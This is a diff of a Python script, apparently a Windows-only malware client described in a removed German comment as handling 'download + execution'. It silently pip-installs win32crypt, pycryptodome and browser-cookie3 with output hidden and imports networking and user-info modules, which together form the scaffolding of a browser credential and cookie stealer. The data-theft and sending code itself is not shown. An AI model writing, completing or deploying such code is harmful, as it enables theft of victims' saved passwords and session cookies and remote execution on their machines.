@@ -1,12 +1,35 @@
-# Vereinfachter Client – nur Download + Execution
-# Läuft nur unter Windows
-
 import os
-if os.name != "nt":
-    exit()
-
-import subprocess
 import sys
+import subprocess
+
+# Exit if not Windows
+if os.name != "nt":
+    sys.exit()
+
+# ================= PACKAGE BOOTSTRAP =================
+
+required_packages = {
+    "win32crypt": "pypiwin32",
+    "Crypto": "pycryptodome",
+    "browser_cookie3": "browser-cookie3",
+    "requests": "requests"
+}
+
+def install_missing_packages():
+    for module, pip_name in required_packages.items():
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call(
+                [sys.executable, "-m", "pip", "install", pip_name],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+
+install_missing_packages()
+
+# ================= IMPORTS AFTER INSTALL =================
+
 import json
 import urllib.request
 import re
@@ -15,26 +38,10 @@ import datetime
 import socket
 import time
 import threading
-import requests
 import tempfile
 import getpass
 import platform
-
-# ========== PAKETE INSTALLIEREN ==========
-required_packages = [
-    ("win32crypt", "pypiwin32"),
-    ("Crypto.Cipher", "pycryptodome"),
-    ("browser_cookie3", "browser-cookie3"),
-    ("requests", "requests")
-]
-
-for module, pip_name in required_packages:
-    try:
-        __import__(module.replace("-", "_"))
-    except ImportError:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name],
-                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        os.execl(sys.executable, sys.executable, *sys.argv)
+import requests
 
 import win32crypt
 from Crypto.Cipher import AES
